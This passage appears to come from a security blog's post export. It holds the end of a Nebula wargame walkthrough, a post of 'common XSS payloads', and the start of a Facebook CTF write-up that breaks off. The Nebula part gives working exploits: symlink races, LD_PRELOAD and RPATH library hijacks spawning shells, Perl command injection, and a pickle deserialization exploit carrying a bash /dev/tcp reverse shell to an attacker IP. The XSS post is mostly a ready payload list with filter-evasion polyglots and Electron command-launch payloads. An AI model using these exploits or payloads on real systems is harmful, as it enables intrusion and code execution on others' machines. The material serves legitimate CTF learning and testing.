authorized_keys key file within the .ssh folder.This could be possible by injecting into a PID of an process. In old Linux systems, a pid of a process is pretty predictable and srandom() seeded with time is predictable. In this scenario, this PID would need to be predicted while running the flag11 program.An ssh key can be created for the level11 userecho -e \"/tmp/level11.key\" | ssh-keygen -t rsa -b 2048 -C \"level11@nebula\"The public key of the level 11 user can now be taken and the following program can now be created.#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;string.h&gt;#include &lt;sys/types.h&gt;#include &lt;fcntl.h&gt;#include &lt;stdio.h&gt;#include &lt;sys/mman.h&gt;/* * Return a random, non predictable file, and return the file descriptor for it. */int getrand(char **path, int pid, int time){  char *tmp;  int fd =  0;  srandom(time);  tmp = getenv(\"TEMP\");  asprintf(path, \"%s/%d.%c%c%c%c%c%c\", tmp, pid,      'A' + (random() % 26), '0' + (random() % 10),      'a' + (random() % 26), 'A' + (random() % 26),      '0' + (random() % 10), 'a' + (random() % 26));  return fd;}void process(char *buffer, int length){  unsigned int key;  int i;  key = length &amp; 0xff;  for(i = 0; i &lt; length; i++) {    buffer[i] ^= key;    key -= buffer[i] ^ key;  }}#define CL \"Content-Length: \"int main(int argc, char **argv){  char line[256];  char buf[2048] = \"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDMPbdIp+lS2MR2oGvA36yE4wenUWZUY1OvNyy872Dx3No9LsWFWC6YOCQ4Unea4grPQCYZw/G7EbIgZSnWwW3+sBUASACxJQtQaAKKkK81C1jjarWMZFyN+1EjZqnaVPpj8qF33gOUKg3q2SUyi5p+a7CgzDS7nwYJ4RTdra38Q8K4HgJm1ZrgoKys7SiPnR6BXqq4DOzoJO8UXzwAUPRl0kV/2lRD2lo4LMieudTWKxZk/CQM5UG0TpwhnUmRIyCn3TwlcViSyp6wtzDY8sSekOh9UAdEwvMHAJX//RK3iEVrNz22v1N64RNQmoeNgyb8NYp7fyCxbwVavxHBvMaP level11@nebula\";  int pid;  int fd;  char *path;  FILE* stream;  //process(buf, sizeof(buf));  //if(NULL == (stream = popen(\"/home/flag11/flag11\", \"w\"))) {  //    errx(1, \"popen\");  //}  //printf(\"Get pid for attacked: \\n\");  //if(fgets(line, sizeof(line), stdin) == NULL) {  //    errx(1, \"reading from stdin\");  //}  pid = getpid()+1;  //printf(\"PID: %d\\n\",pid);  getrand(&amp;path, pid, time(NULL));  symlink(\"/home/flag11/.ssh/authorized_keys\",path);  getrand(&amp;path, pid, time(NULL)+1);  symlink(\"/home/flag11/.ssh/authorized_keys\",path);  fprintf(stdout, \"%s%d\\n%s\",CL,sizeof(buf),buf);  //pclose(stream);}            The above attacker code (taken from stackoverflow Nebula Level 11 Solution) can be used to guess the PID of the flag11 binary. When we pipe the stdout to the stdin of the victim the chances are high it is just plus one of our own exploit binary. Otherwise popen() could be used and injecting pid from ps      grep flag11. The time part is super easy because it is the time in seconds. To get a stable success rate we also use the filename for the next second. The above can be compiled using GCC.      gcc -o exploit exploit_code.cRunning the exploit provides the following output, but it is possible to SSH as the flag11 user since it was possible to inject into the .ssh folder.level11@nebula:/tmp$ ./exploit | /home/flag11/flag11blue = 2048, length = 2048, pink = 395blue = 1653, length = 2048, pink = 0flag11: fread fail(blue = 1653, length = 2048): Operation not permittedLevel12Link: https://exploit.education/nebula/level-12/Level 12 states that a backdoor exists on port 50001 and the following source code is provided.local socket = require(\"socket\")local server = assert(socket.bind(\"127.0.0.1\", 50001))function hash(password)  prog = io.popen(\"echo \"..password..\" | sha1sum\", \"r\")  data = prog:read(\"*all\")  prog:close()  data = string.sub(data, 1, 40)  return dataendwhile 1 do  local client = server:accept()  client:send(\"Password: \")  client:settimeout(60)  local line, err = client:receive()  if not err then      print(\"trying \" .. line) -- log from where ;\\      local h = hash(line)      if h ~= \"4754a4f4bd5787accd33de887b9250a0691dd198\" then          client:send(\"Better luck next time\\n\");      else          client:send(\"Congrats, your token is 413**CARRIER LOST**\\n\")      end  end  client:close()endThe following program takes user input and uses the hash function check whether the user input password matches the password hash “4754a4f4bd5787accd33de887b9250a0691dd198”. The issue here arises from the usage of the popen function which is vulnerable to command injection. As such, you can execute arbitrary commands by injection metacharacters such as ; and |.Level13Link: https://exploit.education/nebula/level-13/Level 13 states that a security check is in place that prevents the program from continuing execution if the user invoking it does not match a specific user id. The following source code is provided.#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;stdio.h&gt;#include &lt;sys/types.h&gt;#include &lt;string.h&gt;#define FAKEUID 1000int main(int argc, char **argv, char **envp){  int c;  char token[256];  if(getuid() != FAKEUID) {      printf(\"Security failure detected. UID %d started us, we expect %d\\n\", getuid(), FAKEUID);      printf(\"The system administrators will be notified of this violation\\n\");      exit(EXIT_FAILURE);  }  // snip, sorry :)  printf(\"your token is %s\\n\", token);  }The security check if verifying whether the UID is 1000. If it isn’t, an error message is printed, otherwise the token is printed. This check can be bypassed by using LD_PRELOAD function to load a shared object file containing a custom getuid() function. Shared libraries are libraries that are loaded by programs when they start. When a shared library is installed properly, all programs that start afterward automatically use the new shared library. The LD_PRELOAD trick exploits functionality provided by the dynamic linker on Unix systems that allows you to tell the linker to bind symbols provided by a certain shared library before other libraries.Using LD_PRELOAD, it is not possible to run SUID binaries. However, it is possible to make a copy of the flag13 binary without the SUID bit set and LDF_PRELOAD can be used to spoof the suid bit, this can then be used to get the token which can be used to SSH as the flag13 user.The following C shared library can be created which returns the UID 1000.int getuid() {    return 1000;}This can then be compiled, set as a shared library and then ran with a copy of the flag13 binary.level13@nebula:~$ gcc -shared -fPIC -o fakesuid.so fakesuid.c      level13@nebula:~$ LD_PRELOAD=/home/level13/fakesuid.so /home/level13/flag13_backup your token is b705702b-76a8-42b0-8844-3adabbe5ac58level13@nebula:~$ Level14Link: https://exploit.education/nebula/level-14/Level 14 states that a program resides in /home/flag14/flag14. It encrypts input and writes it to standard output. An encrypted token file is also in that home directory.Running the binary with random test input, the following can be deduced:level14@nebula:/home/flag14$ ./flag14 ./flag14\t-e\tEncrypt inputlevel14@nebula:/home/flag14$ ./flag14 -eaaaaaaaaaaaaaaaaaaabcdefghijklmnopqr\u001c\u001d^Clevel14@nebula:/home/flag14$ ./flag14 -ebbbbbbbbbbbbbbbbbbbcdefghijklmnopqrs\u001clevel14@nebula:/home/flag14$ ./flag14 -e12345678913579;=?A\u0013It appears that each character is rotated by its index, starting with 0. So a becomes a, a[1] becomes b (ax1), a[2] becomes c (ax2) etc.The following python code can be used to reverse this process. It enumerates through each value in the encrypted token gets the original value by subtracting the ord(index) of the value with its ASCII table value.token = '857:g67?5ABBo:BtDA?tIvLDKL{MQPSRQWW.'count = 0result = []for value in token:  result.append(chr((ord(value) - count)))  count +=1print (\"\".join(result))Running this program will return the following token: 8457c118-887c-4e40-a5a6-33a25353165. This can be used to log in to the flag 14 user account.Level15Link: https://exploit.education/nebula/level-15/Level 15 gives the following information:strace the binary at /home/flag15/flag15 and see if you spot anything out of the ordinary.You may wish to review how to “compile a shared library in linux” and how the libraries are loaded and processed by reviewing the dlopen manpage in depth.Clean up after yourself :)To do this level, log in as the level15 account with the password level15. Files for this level can be found in /home/flag15.By running strace on the binary, it can be deduced that the binary is trying to load a shared library libc.so.6 from within the /var/tmp/flag15 folder.level15@nebula:/home/flag15$ strace ./flag15 execve(\"./flag15\", [\"./flag15\"], [/* 19 vars */]) = 0brk(0)                                  = 0x81e9000access(\"/etc/ld.so.nohwcap\", F_OK)      = -1 ENOENT (No such file or directory)mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb770c000access(\"/etc/ld.so.preload\", R_OK)      = -1 ENOENT (No such file or directory)open(\"/var/tmp/flag15/tls/i686/sse2/cmov/libc.so.6\", O_RDONLY) = -1 ENOENT (No such file or directory)stat64(\"/var/tmp/flag15/tls/i686/sse2/cmov\", 0xbfbd0174) = -1 ENOENT (No such file or directory)open(\"/var/tmp/flag15/tls/i686/sse2/libc.so.6\", O_RDONLY) = -1 ENOENT (No such file or directory)stat64(\"/var/tmp/flag15/tls/i686/sse2\", 0xbfbd0174) = -1 ENOENT (No such file or directory)open(\"/var/tmp/flag15/tls/i686/cmov/libc.so.6\", O_RDONLY) = -1 ENOENT (No such file or directory)stat64(\"/var/tmp/flag15/tls/i686/cmov\", 0xbfbd0174) = -1 ENOENT (No such file or directory)open(\"/var/tmp/flag15/tls/i686/libc.so.6\", O_RDONLY) = -1 ENOENT (No such file or directory)stat64(\"/var/tmp/flag15/tls/i686\", 0xbfbd0174) = -1 ENOENT (No such file or directory)Shared libraries are libraries that are loaded by programs when they start. When a shared library is installed properly, all programs that start afterward automatically use the new shared library. very shared library has a special name called the “soname”. The soname has the prefix “lib”, the name of the library, the phrase `”.so”, followed by a period and a version number. The dynamic linker can be run either indirectly by running some dynamically linked program or shared object. The programs ld.so and ld-linux.so* find and load the shared objects (shared libraries) needed by a program, prepare the program to run, and then run it. LD_PRELOAD is an optional environmental variable containing one or more paths to shared libraries, or shared objects, that the loader will load before any other shared library including the C runtime library (libc.so) This is called preloading a library. To avoid this mechanism being used as an attack vector for suid/sgid executable binaries, the loader ignores LD_PRELOAD if ruid != euid. For such binaries, only libraries in standard paths that are also suid/sgid will be preloaded.The RPATH of the binary can also be found by using objdump. RPATH is used by the dynamic linker at run time to search for shared libraries related to a binary. As mentioned, the loader ignores LD_PRELOAD if ruid != euid but this doesn’t apply to standard RPATH.level15@nebula:/home/flag15$ objdump -p flag15 flag15:     file format elf32-i386Program Header:    PHDR off    0x00000034 vaddr 0x08048034 paddr 0x08048034 align 2**2         filesz 0x00000120 memsz 0x00000120 flags r-x  INTERP off    0x00000154 vaddr 0x08048154 paddr 0x08048154 align 2**0         filesz 0x00000013 memsz 0x00000013 flags r--    LOAD off    0x00000000 vaddr 0x08048000 paddr 0x08048000 align 2**12         filesz 0x000005d4 memsz 0x000005d4 flags r-x    LOAD off    0x00000f0c vaddr 0x08049f0c paddr 0x08049f0c align 2**12         filesz 0x00000108 memsz 0x00000110 flags rw- DYNAMIC off    0x00000f20 vaddr 0x08049f20 paddr 0x08049f20 align 2**2         filesz 0x000000d0 memsz 0x000000d0 flags rw-    NOTE off    0x00000168 vaddr 0x08048168 paddr 0x08048168 align 2**2         filesz 0x00000044 memsz 0x00000044 flags r--EH_FRAME off    0x000004dc vaddr 0x080484dc paddr 0x080484dc align 2**2         filesz 0x00000034 memsz 0x00000034 flags r--   STACK off    0x00000000 vaddr 0x00000000 paddr 0x00000000 align 2**2         filesz 0x00000000 memsz 0x00000000 flags rw-   RELRO off    0x00000f0c vaddr 0x08049f0c paddr 0x08049f0c align 2**0         filesz 0x000000f4 memsz 0x000000f4 flags r--Dynamic Section:  NEEDED               libc.so.6  RPATH                /var/tmp/flag15  INIT                 0x080482c0  FINI                 0x080484ac  GNU_HASH             0x080481ac  STRTAB               0x0804821c  SYMTAB               0x080481cc  STRSZ                0x0000005a  SYMENT               0x00000010  DEBUG                0x00000000  PLTGOT               0x08049ff4  PLTRELSZ             0x00000018  PLTREL               0x00000011  JMPREL               0x080482a8  REL                  0x080482a0  RELSZ                0x00000008  RELENT               0x00000008  VERNEED              0x08048280  VERNEEDNUM           0x00000001  VERSYM               0x08048276Version References:  required from libc.so.6:    0x0d696910 0x00 02 GLIBC_2.0The program loads the shared libraries before it executes, if we create a custom shared library with the same name of libc.so.6 then place it under rpath is set (/var/tmp/flag16), the program running with flag16 privilege will execute my custom code.A shared library can be created by creating a C file and creating the libc_start_main function which can have a system call to the /bin/bash binary. libc_start_main is a function that belongs to libc.so.6, responsible for setting up the environment for our process and, after that, call main function. You will also need to provide the __cxa_finalize symbol or else the C code will return with an exit status. This can be verified with LD_DEBUG#include &lt;stdio.h&gt;#include &lt;sys/syscall.h&gt;#include &lt;unistd.h&gt;void __cxa_finalize(void *d) {    return;}int __libc_start_main(int (*main) (int, char * *, char * *), int argc, char * * ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end)) {    system(\"/bin/sh\");    return 0;}During compilation, you will also need to provide the version reference for libc.so.6, in this case, it is GLIBC_2.0. This can be seen in the previous objdump output. As such, a file can be created with the following.GLIBC_2.0{};This can then be compiled using GCC.gcc -shared -static-libgcc -fPIC -Wl,--version-script=version.ld,-Bstatic exploit.c -o libc.so.6This can then be used to get a shell as the flag15 user.Level16Link: https://exploit.education/nebula/level-16/Level 16 states that the following perl script is running on port 1616.#!/usr/bin/env perluse CGI qw{param};print \"Content-type: text/html\\n\\n\";sub login {  $username = $_[0];  $password = $_[1];  $username =~ tr/a-z/A-Z/; # conver to uppercase  $username =~ s/\\s.*//;        # strip everything after a space  @output = `egrep \"^$username\" /home/flag16/userdb.txt 2&gt;&amp;1`;  foreach $line (@output) {      ($usr, $pw) = split(/:/, $line);        if($pw =~ $password) {          return 1;      }  }  return 0;}sub htmlz {  print(\"&lt;html&gt;&lt;head&gt;&lt;title&gt;Login resuls&lt;/title&gt;&lt;/head&gt;&lt;body&gt;\");  if($_[0] == 1) {      print(\"Your login was accepted&lt;br/&gt;\");  } else {      print(\"Your login failed&lt;br/&gt;\");  }      print(\"Would you like a cookie?&lt;br/&gt;&lt;br/&gt;&lt;/body&gt;&lt;/html&gt;\\n\");}htmlz(login(param(\"username\"), param(\"password\")));Looking at the above script, the following line is vulnerable to command/argument injection.@output = `egrep \"^$username\" /home/flag16/userdb.txt 2&gt;&amp;1`;However, the above script will turn the user provided username to uppercase and will strip everything after a space (line11 and line12). An easy way to bypass this is to use backticks with the following payload where exploit is a bash script: /*/EXPLOIT.SH.Within the bash script, the following payload can be inserted.level16@nebula:~$ cat /tmp/EXPLOIT.SH #!/bin/bashgetflag &gt; /tmp/flagThis is needed because it is not possible to inject directly into the script and view results directly.level16@nebula:~$ vi /tmp/EXPLOITlevel16@nebula:~$ nc 127.0.0.1 1616GET /index.cgi?username=%24%28%2F%2A%2FEXPLOIT.SH%29&amp;password=Content-type: text/htmlThis can then be run to execute the getflag command as the flag16 user.Level17Link: https://exploit.education/nebula/level-17/Level 17 states that a python script is running on port 10007 that contains a vulnerability. The source code of this program is shown below:#!/usr/bin/pythonimport osimport pickleimport timeimport socketimport signalsignal.signal(signal.SIGCHLD, signal.SIG_IGN)def server(skt):  line = skt.recv(1024)  obj = pickle.loads(line)  for i in obj:      clnt.send(\"why did you send me \" + i + \"?\\n\")skt = socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0)skt.bind(('0.0.0.0', 10007))skt.listen(10)while True:  clnt, addr = skt.accept()  if(os.fork() == 0):      clnt.send(\"Accepted connection from %s:%d\" % (addr[0], addr[1]))      server(clnt)      exit(1)The above program takes data via a network socket, uses pickle (serialization) and then prints the data back. The pickle module within is not secure against data provided by user input and can result in deserialization attacks.The following attacker script can be used to take a command such as bash -i &gt;&amp; /dev/tcp/192.168.1.12/4444 0&gt;&amp;1 which when executed will run bash, open a network socket and will bind bash and connect back to an attacker controlled IP address.This is the serialized using pickle and this data is then written to a file.import pickleimport sysimport base64import osCOMMAND = \"bash -i &gt;&amp; /dev/tcp/192.168.1.12/4444 0&gt;&amp;1\"class PickleRce(object):    def __reduce__(self):        import os        return (os.system,(COMMAND,))os.system(\"touch exploit\")with open('exploit', \"wb\") as exploit:    pickle.dump(PickleRce(),exploit, pickle.HIGHEST_PROTOCOL)     This data can now be sent to the python script.snoopy@snoopy-XPS-15-9570:~$ cat exploit �\u0002cposixsystemqU*bash -i &gt;&amp; /dev/tcp/192.168.1.12/4444 0&gt;&amp;1q\u0001�q\u0002Rq\u0003.snoopy@snoopy-XPS-15-9570:~$ cat exploit | nc -nv 192.168.1.24 10007Connection to 192.168.1.24 10007 port [tcp/*] succeeded!Accepted connection from 192.168.1.12:33428This will then connect back to a netcat listener listening on port 4444.Level18Link: https://exploit.education/nebula/level-18/Level 18 provides the source code for the following C program. It is also stated that there are multiple ways to complete this challenge.#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;string.h&gt;#include &lt;stdio.h&gt;#include &lt;sys/types.h&gt;#include &lt;fcntl.h&gt;#include &lt;getopt.h&gt;struct {  FILE *debugfile;  int verbose;  int loggedin;} globals;#define dprintf(...) if(globals.debugfile) \\  fprintf(globals.debugfile, __VA_ARGS__)#define dvprintf(num, ...) if(globals.debugfile &amp;&amp; globals.verbose &gt;= num) \\  fprintf(globals.debugfile, __VA_ARGS__)#define PWFILE \"/home/flag18/password\"void login(char *pw){  FILE *fp;  fp = fopen(PWFILE, \"r\");  if(fp) {      char file[64];      if(fgets(file, sizeof(file) - 1, fp) == NULL) {          dprintf(\"Unable to read password file %s\\n\", PWFILE);          return;      }                fclose(fp);      if(strcmp(pw, file) != 0) return;         }  dprintf(\"logged in successfully (with%s password file)\\n\",      fp == NULL ? \"out\" : \"\");    globals.loggedin = 1;}void notsupported(char *what){  char *buffer = NULL;  asprintf(&amp;buffer, \"--&gt; [%s] is unsupported at this current time.\\n\", what);  dprintf(what);  free(buffer);}void setuser(char *user){  char msg[128];  sprintf(msg, \"unable to set user to '%s' -- not supported.\\n\", user);  printf(\"%s\\n\", msg);}int main(int argc, char **argv, char **envp){  char c;  while((c = getopt(argc, argv, \"d:v\")) != -1) {      switch(c) {          case 'd':              globals.debugfile = fopen(optarg, \"w+\");              if(globals.debugfile == NULL) err(1, \"Unable to open %s\", optarg);              setvbuf(globals.debugfile, NULL, _IONBF, 0);              break;          case 'v':              globals.verbose++;              break;      }  }  dprintf(\"Starting up. Verbose level = %d\\n\", globals.verbose);  setresgid(getegid(), getegid(), getegid());  setresuid(geteuid(), geteuid(), geteuid());    while(1) {      char line[256];      char *p, *q;      q = fgets(line, sizeof(line)-1, stdin);      if(q == NULL) break;      p = strchr(line, '\\n'); if(p) *p = 0;      p = strchr(line, '\\r'); if(p) *p = 0;      dvprintf(2, \"got [%s] as input\\n\", line);      if(strncmp(line, \"login\", 5) == 0) {          dvprintf(3, \"attempting to login\\n\");          login(line + 6);      } else if(strncmp(line, \"logout\", 6) == 0) {          globals.loggedin = 0;      } else if(strncmp(line, \"shell\", 5) == 0) {          dvprintf(3, \"attempting to start shell\\n\");          if(globals.loggedin) {              execve(\"/bin/sh\", argv, envp);              err(1, \"unable to execve\");          }          dprintf(\"Permission denied\\n\");      } else if(strncmp(line, \"logout\", 4) == 0) {          globals.loggedin = 0;      } else if(strncmp(line, \"closelog\", 8) == 0) {          if(globals.debugfile) fclose(globals.debugfile);          globals.debugfile = NULL;      } else if(strncmp(line, \"site exec\", 9) == 0) {          notsupported(line + 10);      } else if(strncmp(line, \"setuser\", 7) == 0) {          setuser(line + 8);      }  }  return 0;}Looking at the main function, the program looks for -d file which enables logging to the provided log file and -v` to increase the verbosity level.One interesting thing to note right away is the following code block which opens the /home/flag18/password file and compares the input against the contents of that file.A problem here arises because global.loggedin = 1 is outside of the if(fp) block. As such, if an fopen() call returns NULL, it is possible to skip the if conditional block and be loggedin.#define PWFILE \"/home/flag18/password\"void login(char *pw){  FILE *fp;  fp = fopen(PWFILE, \"r\");  if(fp) {      char file[64];      if(fgets(file, sizeof(file) - 1, fp) == NULL) {          dprintf(\"Unable to read password file %s\\n\", PWFILE);          return;      }                fclose(fp);      if(strcmp(pw, file) != 0) return;         }  dprintf(\"logged in successfully (with%s password file)\\n\",      fp == NULL ? \"out\" : \"\");    globals.loggedin = 1;}}One way to get the fopen() call to return NULL is by exhausting the system’s available file descriptors. For each Linux system, there are limits defined for the maximum amount of files that can be opened. THe below command shows the amount of descriptors presently allocated and the maximum descriptors that can be used.level18@nebula:~$ sysctl fs.file-nrfs.file-nr = 352\t0\t100898Looking at the above output, 320 out of 100898 file descriptors are currently being used.However, there are some limits defined for how many files can be opened per process; ulimit -a command can be used to get this information. The H option within ulimit can be used to get Hard limits. This requires root privileges to modify. The S option within ulimit can be used to get Soft limits. This option can be modified by the current user:level18@nebula:~$ ulimit -Sa |grep filesopen files                      (-n) 1024level18@nebula:~$ ulimit -Ha |grep filesopen files                      (-n) 4096level18@nebula:~$By knowing that 1024 is the open file limit, one way to solve this challenge is to exhaust the filedescriptors up all system file handlers and then call the flag18 program’s login command that will fail opening the password file and will set the loggedin flag to 1. 3 descriptors should also be spared for stdin, stdout and stderr so it is possible to run getflag after running the program.level18@nebula:/tmp$ python -c 'print(\"login foo\\n\"*1021)' &gt; /home/level18/foolevel18@nebula:/tmp$ python -c 'print(\"closelog\")' &gt;&gt; /home/level18/foolevel18@nebula:/tmp$  python -c 'print(\"shell\")' &gt;&gt; /home/level18/foolevel18@nebula:/tmp$ cat /home/level18/foo | /home/flag18/flag18 -d /dev/ttyStarting up. Verbose level = 0logged in successfully (without password file)The above python script tries to login 1021 times, closes the connection and gets a system shell. This can then be used to run the flag program and a /dev/tty can be specified to get a shell.In the above command, anything specified after the -d parameter and anything following it to be ignored. We can achieve this by passing either –init-file or –rcfile as our first argument to flag18. The -d parameter will then be ignored by bashLevel19Link: https://exploit.education/nebula/level-19/Level 19 provides the following source and mentions that there is a flaw in the below program in how it operates.#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;string.h&gt;#include &lt;sys/types.h&gt;#include &lt;stdio.h&gt;#include &lt;fcntl.h&gt;#include &lt;sys/stat.h&gt;int main(int argc, char **argv, char **envp){  pid_t pid;  char buf[256];  struct stat statbuf;  /* Get the parent's /proc entry, so we can verify its user id */  snprintf(buf, sizeof(buf)-1, \"/proc/%d\", getppid());  /* stat() it */  if(stat(buf, &amp;statbuf) == -1) {      printf(\"Unable to check parent process\\n\");      exit(EXIT_FAILURE);  }  /* check the owner id */  if(statbuf.st_uid == 0) {      /* If root started us, it is ok to start the shell */      execve(\"/bin/sh\", argv, envp);      err(1, \"Unable to execve\");  }  printf(\"You are unauthorized to run this program\\n\");}By looking at the above program, it executes a shell if the parent process was started by root. Within the program itself, getppid is used to achieve this. getppid returns the pid of the parent of the calling process is what defines whether a shell should be given or not. getppid returns the PID of init e.g. 1 and /proc/1 is owned by root. The way to solve this challenge is to kill the parent process which called the flag19 program before the program calls getppid.#include &lt;unistd.h&gt;int main(int argc, char **argv, char **envp) {    int childPID = fork();    if(childPID &gt;= 0) { // forked        if(childPID == 0) { // child            sleep(1);            setresuid(geteuid(),geteuid(),geteuid());            char *args[] = {\"/bin/sh\", \"-c\", \"/bin/getflag\", NULL};            execve(\"/home/flag19/flag19\", args, envp);        }    }    return 0;}The above program creates a process using fork. Fork system call is used for creating a new process, which is called child process, which runs concurrently with the process that makes the fork() call (parent process). After a new child process is created, both processes will execute the next instruction following the fork() system call. sleep is then used to force create an orphan process that would be claimed by init, which is owned by root. Then the exec call is done to run the flag19 program which is execute the getflag command.This brings to the end Exploit Exercises Nebula. Overall, the challenges were great fun and difficulty increased throughout and required me to look at multiple writeups online to complete this."
  },
  
  {
    "title": "Common XSS payloads I use",
    "url": "/posts/08_common_xss_payloads_i_use/",
    "categories": "web application security",
    "tags": "xss",
    "date": "2019-08-03 03:25:52 +0800",
    





    
    "snippet": "Common XSS Tricks I useThis post contains a common list of XSS payloads I tend to use most of often. Taken from the internet, the origin of most of these payloads are uknown but they are often shar...",
    "content": "Common XSS Tricks I useThis post contains a common list of XSS payloads I tend to use most of often. Taken from the internet, the origin of most of these payloads are uknown but they are often shared on twitter.Detection/ProbingI usually use the following payloads from probing/detection:&lt;iframe/onload=prompt(1)&gt;&lt;img src=1 onerror=confirm(1)&gt;&lt;snoopy contenteditable id=x onfocus=prompt()&gt;Context BreakingHTML Context&lt;a href=\"javaScriPt:alert(1)\"&gt;CLICKHERE&lt;/a&gt;&lt;svg/onload=&amp;#97&amp;#108&amp;#101&amp;#114&amp;#116(1)&gt;&lt;details/open/ontoggle=\"alert(1)\"/&gt;JavaScript Context);alert(1);//'-confirm(1)-' '-confirm`1`-'');confirm(1);');confirm(1);// '-confirm(1)-'Attribute Contextvalue=\"\" onmouseover=\"alert('XSS')\"&gt;value=#000000r93kponfocus=alert(1)autofocus=r93kpcolor-input=%23000000 onmouseover=alert(1)  ?q=&lt;body style=overflow:auto;height:1000px onscroll=alert(1337) id=x&gt;#x onmouseover=confirm(1) num=' onerror=alert(1) alt='\"\" onmouseover=alert(1) \"&gt; \"onload=\"javascript:alert(1) \" onload=\"alert(1) \"onmouseover=\"confirm(1)//URL Contextdata:text/html;base64,PHNjcmlwdD5hbGVydCgnWmVwaHJGaXNoJyk8L3NjcmlwdD4=data://text/javascript/alert(1)/onafterscriptexecute=confirm(1)1='#onafterscriptexecute=confirm(1)1=' data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==EncodingsURI Encoding&lt;a href=\"javascript:alert%281%29\"&gt;xss&lt;/a&gt;&lt;iframe src=\"javascript:%61%6c%65%72%74%28%31%29\"/&gt;HTML Entities&lt;img src=x onerror=&amp;#x22;&amp;#x61;&amp;#x6C;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x31;&amp;#x29;&amp;#x22;&gt;&lt;a href=\"javascript:alert&amp;#x28;1&amp;#x29\"&gt;xss&lt;/a&gt;Markdown XSS Payloads I commonly use[ClickMe](javascript:prompt(window.location.pathname))[ClickME](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)![ClickME](https://www.example.com/image.png\"onload=\"alert(1))Other common things I try:* Case Sensitive: `&lt;Iframe Src=\"//snoopysecurity\" OnlOad=\"alert(0)\"/&gt;`* Arbritary Tags `&lt;snoopy onmouseover=\"alert(1)\"&gt;Test&lt;/snoopy&gt;`* Insert with no closing tags: `&lt;img src=\"x\" onerror=\"alert(1)\"` (Browsers will happily execute this)* Add forward slashes or whitespace e.g. svg onload or svg/onloadPolyglot (Taken from https://github.com/0xsobky/HackVault/wiki/Unleashing-an-Ultimate-XSS-Polyglot)jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//&lt;/stYle/&lt;/titLe/&lt;/teXtarEa/&lt;/scRipt/--!&gt;\\x3csVg/&lt;sVg/oNloAd=alert()//&gt;\\x3eMulti-context, filter bypass based polyglot payload #1 (Rsnake XSS Cheat Sheet)';alert(String.fromCharCode(88,83,83))//';alert(String. fromCharCode(88,83,83))//\";alert(String.fromCharCode (88,83,83))//\";alert(String.fromCharCode(88,83,83))//-- &gt;&lt;/SCRIPT&gt;\"&gt;'&gt;&lt;SCRIPT&gt;alert(String.fromCharCode(88,83,83)) &lt;/SCRIPT&gt; Multi-context, filter bypass based polyglot payload #2 (Ashar Javed XSS Research)\"&gt;&gt;&lt;marquee&gt;&lt;img src=x onerror=confirm(1)&gt;&lt;/marquee&gt;\" &gt;&lt;/plaintext\\&gt;&lt;/|\\&gt;&lt;plaintext/onmouseover=prompt(1) &gt;&lt;script&gt;prompt(1)&lt;/script&gt;@gmail.com&lt;isindex formaction=javascript:alert(/XSS/) type=submit&gt;'--&gt;\" &gt;&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;\"&gt;&lt;img/id=\"confirm&amp;lpar; 1)\"/alt=\"/\"src=\"/\"onerror=eval(id&amp;%23x29;&gt;'\"&gt;&lt;img src=\"http: //i.imgur.com/P8mL8.jpg\"&gt;SWF Parameter XSSFor automation, you can use Flashbang, Flare or HP SWFScan.* Common Parameters: onload, allowedDomain, movieplayer, xmlPath, eventhandler, callback (more on OWASP page)* Common Injection Strings: `` +\\%22})))}catch(e){alert(document.domain);}//, ”]);}catch(e){}if(!self.a)self.a=!alert(document.domain);//,“a”)(({type:”ready”}));}catch(e){alert(1)}//``Electron&lt;iframe src=x onload=\"require('electron').shell.openExternal('C:/Windows/System32/calc.exe')\"&gt;&lt;/iframe&gt;\"&gt;&lt;img src=1 onerror=\"var os = require('os'); var hostname = os.platform(); var homedir = os.homedir(); alert('Host:' + hostname + 'directory: ' + homedir);\"&gt;&lt;onmouseover=\"alert(1)\"&gt; &lt;s onmouseover=\"var os = require('os'); var hostname = os.platform(); var homedir = os.homedir(); alert('Host:' + hostname + 'directory: ' + homedir);\"&gt;Hallo&lt;/s&gt;Following resources are great reference guides:* https://portswigger.net/web-security/cross-site-scripting/cheat-sheet* https://github.com/masatokinugawa/filterbypass* https://github.com/cure53/H5SC* https://owasp.org/www-community/xss-filter-evasion-cheatsheet#XSS_Locator* https://htmledit.squarefree.com/"
  },
  
  {
    "title": "Facebook CTF 2019: Products Manager Writeup",
    "url": "/posts/10_Facebook_CTF_product_manager/",
    "categories": "capture the flag",
    "tags": "facebook ctf",
    "date": "2019-06-09 03:25:52 +0800",
    





    
    "snippet": "This challenge was part of Facebook CTF . Looking at the challenge tab, the following information is provided:Going to the provided URL, this leads to the following web application where you can ad...",
    "content": "This challenge was part of Facebook CTF . Looking at the challenge tab, the following information is provided:Going to the provided URL, this leads to the following web application where you can add and view your own products.Going to the view products area shows the top 5 products within the application.To add a product, a secret needs to be created. After a product is added, this can be viewed and by submitting the product name and the secret. The source code the application is also provided for the challenge.index.php&lt;?phprequire_once(\"db.php\");$products = get_top_products();require_once(\"header.php\");?&gt;&lt;p&gt;  &lt;ul&gt;&lt;?phpforeach ($products as $product) {  echo \"&lt;li&gt;\" . htmlentities($product['name']) . \"&lt;/li&gt;\";}?&gt;  &lt;/ul&gt;&lt;/p&gt;&lt;?php require_once(\"footer.php\");db.php&lt;?php/*CREATE TABLE products (  name char(64),  secret char(64),  description varchar(250));INSERT INTO products VALUES('facebook', sha256(....), 'FLAG_HERE');INSERT INTO products VALUES('messenger', sha256(....), ....);INSERT INTO products VALUES('instagram', sha256(....), ....);INSERT INTO products VALUES('whatsapp', sha256(....), ....);INSERT INTO products VALUES('oculus-rift', sha256(....), ....);*/error_reporting(0);require_once(\"config.php\"); // DB config$db = new 